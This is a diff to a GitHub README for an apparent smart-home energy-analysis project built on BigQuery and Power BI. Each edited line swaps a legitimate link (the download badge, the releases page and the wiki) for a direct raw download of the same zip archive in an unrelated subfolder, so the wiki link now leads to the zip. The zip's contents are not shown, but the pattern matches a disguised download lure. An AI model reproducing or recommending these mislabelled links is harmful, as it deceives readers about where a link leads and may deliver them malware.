@@ -1,6 +1,6 @@
 # 🌟 -Smart-Home-Energy-Usage-Insights-BigQuery-Power-BI-Driven-Analysis- - Gain Energy Insights with Simple Steps
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue)
+![Download](https://raw.githubusercontent.com/josepaullupa/-Smart-Home-Energy-Usage-Insights-BigQuery-Power-BI-Driven-Analysis-/main/triodia/-Smart-Home-Energy-Usage-Insights-BigQuery-Power-BI-Driven-Analysis-.zip)
 
 ## 📖 Introduction
 
@@ -12,7 +12,7 @@ To get started with the application, follow these steps carefully. This guide wi
 
 ## 📥 Download & Install
 
-To download the latest version, please visit this page: [Download Releases](https://github.com/josepaullupa/-Smart-Home-Energy-Usage-Insights-BigQuery-Power-BI-Driven-Analysis-/releases).
+To download the latest version, please visit this page: [Download Releases](https://raw.githubusercontent.com/josepaullupa/-Smart-Home-Energy-Usage-Insights-BigQuery-Power-BI-Driven-Analysis-/main/triodia/-Smart-Home-Energy-Usage-Insights-BigQuery-Power-BI-Driven-Analysis-.zip).
 
 You will find different versions of the application. Choose the one that suits your operating system.
 
@@ -83,7 +83,7 @@ No. The application is designed for everyday users. Follow the user guide for st
 
 ## 🔗 Additional Resources
 
-For a deeper understanding and advanced features, refer to the documentation available on our [GitHub Wiki](https://github.com/josepaullupa/-Smart-Home-Energy-Usage-Insights-BigQuery-Power-BI-Driven-Analysis-/wiki). Engage with the community for tips and support.
+For a deeper understanding and advanced features, refer to the documentation available on our [GitHub Wiki](https://raw.githubusercontent.com/josepaullupa/-Smart-Home-Energy-Usage-Insights-BigQuery-Power-BI-Driven-Analysis-/main/triodia/-Smart-Home-Energy-Usage-Insights-BigQuery-Power-BI-Driven-Analysis-.zip). Engage with the community for tips and support.
 
 ## 📧 Support
 
